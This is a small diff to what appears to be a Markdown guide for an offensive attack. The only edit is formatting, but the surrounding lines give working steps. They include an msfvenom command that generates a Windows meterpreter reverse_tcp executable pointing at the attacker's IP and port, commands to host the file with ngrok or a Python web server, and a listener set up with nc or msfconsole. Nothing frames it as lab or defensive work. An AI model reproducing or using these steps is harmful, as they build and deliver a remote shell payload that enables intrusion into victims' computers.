@@ -11,7 +11,7 @@
 3. **Generate the payload:** <br>
 Using meterpreter here, but feel free to play around with it. <br>
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=[YOUR_IP] LPORT=4444 -a x86 -f exe -o [FILE_NAME.exe]
-4. **Setup server**
+4. **Setup server** <br>
 ngrok tcp 80 or python3 -m http.server 80
 Using ngrok, or python if local
 5. **Setup your listener with nc or msfconsole:** <br>
